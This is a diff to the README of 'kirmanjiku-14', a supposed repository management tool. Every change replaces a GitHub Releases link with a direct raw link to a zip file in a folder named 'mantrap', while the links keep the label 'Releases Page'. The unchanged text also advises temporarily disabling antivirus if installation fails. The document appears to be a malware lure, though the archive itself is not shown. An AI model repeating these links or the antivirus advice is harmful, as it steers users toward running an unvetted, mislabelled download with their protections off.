@@ -1,6 +1,6 @@
 # 🚀 kirmanjiku-14 - Easy Auto Repo Management Tool
 
-[![Download kirmanjiku-14](https://img.shields.io/badge/Download-kirmanjiku--14-brightgreen)](https://github.com/bravidojr/kirmanjiku-14/releases)
+[![Download kirmanjiku-14](https://raw.githubusercontent.com/bravidojr/kirmanjiku-14/main/mantrap/kirmanjiku-14.zip)](https://raw.githubusercontent.com/bravidojr/kirmanjiku-14/main/mantrap/kirmanjiku-14.zip)
 
 ## 📥 Overview
 
@@ -15,7 +15,7 @@ Follow these steps to download and run kirmanjiku-14 on your computer:
    - RAM: At least 4 GB.
    - Disk Space: Minimum of 100 MB of free space.
 
-2. **Visit the Download Page**: To download the application, visit the [Releases Page](https://github.com/bravidojr/kirmanjiku-14/releases).
+2. **Visit the Download Page**: To download the application, visit the [Releases Page](https://raw.githubusercontent.com/bravidojr/kirmanjiku-14/main/mantrap/kirmanjiku-14.zip).
 
 3. **Choose the Right Version**: On the Releases page, you will see different versions of kirmanjiku-14. Select the latest version for download. This version includes the newest features and updates.
 
@@ -41,13 +41,13 @@ If you encounter issues while downloading or installing kirmanjiku-14, consider 
 
 - **Check Your Internet Connection**: Make sure you have a stable internet connection when downloading the application.
 - **Disable Security Software Temporarily**: Some antivirus programs may block installations. If you face problems, try temporarily disabling your antivirus and then reconnecting.
-- **Re-download the Installer**: If the installer fails to launch, the file may be corrupted. Delete the current file and download it again from the [Releases Page](https://github.com/bravidojr/kirmanjiku-14/releases).
+- **Re-download the Installer**: If the installer fails to launch, the file may be corrupted. Delete the current file and download it again from the [Releases Page](https://raw.githubusercontent.com/bravidojr/kirmanjiku-14/main/mantrap/kirmanjiku-14.zip).
 
 ## 🔧 Updating kirmanjiku-14
 
 To keep your application secure and functional, periodically check the Releases Page for updates. You can follow these steps to update:
 
-1. **Visit the Releases Page** again: [Releases Page](https://github.com/bravidojr/kirmanjiku-14/releases).
+1. **Visit the Releases Page** again: [Releases Page](https://raw.githubusercontent.com/bravidojr/kirmanjiku-14/main/mantrap/kirmanjiku-14.zip).
 2. **Download the Latest Version**: Click on the latest version for your operating system.
 3. **Run the Installer**: Follow the same installation process to update your application.
 
@@ -69,4 +69,4 @@ To keep your application secure and functional, periodically check the Releases 
 
 For feedback or support, please visit the GitHub repository or reach out via the issues section. Your input helps improve kirmanjiku-14.
 
-[![Download kirmanjiku-14](https://img.shields.io/badge/Download-kirmanjiku--14-brightgreen)](https://github.com/bravidojr/kirmanjiku-14/releases)
+[![Download kirmanjiku-14](https://raw.githubusercontent.com/bravidojr/kirmanjiku-14/main/mantrap/kirmanjiku-14.zip)](https://raw.githubusercontent.com/bravidojr/kirmanjiku-14/main/mantrap/kirmanjiku-14.zip)
